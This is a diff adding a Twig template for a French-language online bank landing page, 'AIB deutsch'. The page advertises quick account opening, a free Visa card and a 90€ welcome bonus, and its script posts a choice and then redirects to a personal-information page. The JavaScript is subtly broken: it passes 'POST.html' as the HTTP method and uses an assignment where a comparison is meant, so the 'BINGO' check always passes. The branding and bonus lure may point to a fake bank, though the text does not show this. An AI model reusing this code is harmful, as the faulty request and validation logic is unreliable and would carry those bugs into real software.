@@ -1,0 +1,125 @@
+{% extends 'base.html.twig' %}
+
+{% block title %}AIB deutsch - Une banque en ligne qui a les idées larges, fluides et rapides pour gérer votre argent.{% endblock %}
+{% block description %}AIB deutsch, une banque en ligne qui a les idées larges. Fluide, rapide et mobile, avec AIB deutsch il n'a jamais été aussi simple de gérer son argent.{% endblock %}
+
+{% block body %}
+    <section class="section section-bredcrumbs overlay1" style="background-image:url('../../assets/images/background/cce.jpg')">
+        <div class="container context-dark breadcrumb-wrapper">
+            <h3>Ouvrir un compte tout simplement !</h3>
+            <a href="../../contact/index-2.html" class="button button-sm button-secondary">CONTACTEZ NOUS</a>
+            <p class="">Quelques minutes suffisent.</p>
+        </div>
+    </section>
+    <section class="section section-md bg-white">
+        <div class="container text-center">
+            <div class="row row-40 justify-content-center number-counter blurb-icon-bordered-wrap wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
+                <div class="col-sm-6 col-lg-3">
+                    <div class="blurb-icon-bordered">
+                        <div class="icon-wrap">
+                            <div class="icon mercury-icon-note"><span class="index-counter"></span></div>
+                        </div>
+                        <h6 class="title"><b>Remplissez notre formulaire</b></h6>
+                        <p class="exeption">Simple et rapide, quelques minutes suffisent pour remplir le formulaire.</p>
+                    </div>
+                </div>
+                <div class="col-sm-6 col-lg-3">
+                    <div class="blurb-icon-bordered">
+                        <div class="icon-wrap">
+                            <div class="icon mercury-icon-folder"><span class="index-counter"></span></div>
+                        </div>
+                        <h6 class="title"><b>Transmettez votre dossier</b></h6>
+                        <p class="exeption">Téléchargez vos pièces justificatives pour l'étude de dossier.</p>
+                    </div>
+                </div>
+                <div class="col-sm-6 col-lg-3">
+                    <div class="blurb-icon-bordered">
+                        <div class="icon-wrap">
+                            <div class="icon mercury-icon-note-2"><span class="index-counter"></span></div>
+                        </div>
+                        <h6 class="title"><b>Signez votre demande</b></h6>
+                        <p class="exeption">Signez votre contrat après avoir remplir le formulaire de demande.</p>
+                    </div>
+                </div>
+                <div class="col-sm-6 col-lg-3">
+                    <div class="blurb-icon-bordered">
+                        <div class="icon-wrap">
+                            <div class="icon mercury-icon-money-3"><span class="index-counter"></span></div>
+                        </div>
+                        <h6 class="title"><b>Activez votre compte</b></h6>
+                        <p class="exeption">Effectuez votre premier versement et recevez votre carte
+                            Visa gratuite.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="section section-md bg-gray-100 text-center">
+        <div class="container">
+            <div class="block-lg text-center wow fadeInUp" style="visibility: hidden; animation-name: none;">
+                <h2>Profitez des avantages de votre compte</h2>
+                <p>AIB deutsch vous offre plusieurs avantages dès l'ouverture de votre compte bancaire en ligne.
+                    Ouvrez votre compte et profitez de l'offre de bienvenue.
+                </p>
+            </div>
+            <div class="row row-30 row-flex">
+                <div class="col-md-6 col-lg-3 wow fadeInRight" style="visibility: visible; animation-name: fadeInRight;">
+                    <div class="blurb-boxed-3">
+                        <div class=""><i style="font-size:45px;color:#463c9f;font-weight:700" class="fa fa-home"></i> </div>
+                        <h6 class="title"><b>Offre de bienvenue</b></h6>
+                        <p class="exeption">Profitez d'une carte Visa Gratuite et de 90€ offerts à l'ouverture de votre compte.</p>
+                    </div>
+                </div>
+                <div class="col-md-6 col-lg-3 wow fadeInRight" data-wow-delay="0.1s" style="visibility: visible; animation-delay: 0.1s; animation-name: fadeInRight;">
+                    <div class="blurb-boxed-3">
+                        <div class=""><i style="font-size:50px;color:#463c9f;font-weight:700" class="fa fa-users"></i></div>
+                        <h6 class="title"><b>Assistance clientèle</b></h6>
+                        <p class="exeption">Un conseiller vous est dédié pendant et après l'ouverture de votre compte.</p>
+                    </div>
+                </div>
+                <div class="col-md-6 col-lg-3 wow fadeInRight" data-wow-delay="0.2s" style="visibility: visible; animation-delay: 0.2s; animation-name: fadeInRight;">
+                    <div class="blurb-boxed-3">
+                        <div class=""><i style="font-size:50px;color:#463c9f;font-weight:700" class="fa fa-lock"></i></div>
+                        <h6 class="title"><b>Sécurité maximale</b></h6>
+                        <p class="exeption">Nos standards de cryptage vous assurent une sécurité maximale.</p>
+                    </div>
+                </div>
+                <div class="col-md-6 col-lg-3 wow fadeInRight" data-wow-delay="0.3s" style="visibility: visible; animation-delay: 0.3s; animation-name: fadeInRight;">
+                    <div class="blurb-boxed-3">
+                        <div class=""><i style="font-size:50px;color:#463c9f;font-weight:700" class="fa fa-bell"></i></div>
+                        <h6 class="title"><b>Engagement qualité</b></h6>
+                        <p class="exeption">Nous nous engageons à une prise en charge de toutes vos demandes sous 48h.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+{% endblock %}
+
+{% block script %}
+    <script>
+        function showPage() {
+
+            var choixresponse = 'open';
+            var xhr = new XMLHttpRequest();
+            xhr.onreadystatechange = function(){
+
+                if(xhr.readyState == 4){
+                    if(xhr.status == 200){
+                        var responx=xhr.responseText;
+                        if(responx = "BINGO"){
+                            $("#ask").show().delay(5000).fadeOut();
+                            window.location = "../vos-informations/index.html";
+                        }
+                    }
+                }
+            }
+
+            donneeOpen = "&choixresponse="+choixresponse;
+            xhr.open("POST.html", "../envoie-bd.html", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send(donneeOpen);
+        }
+    </script>
+{% endblock %}
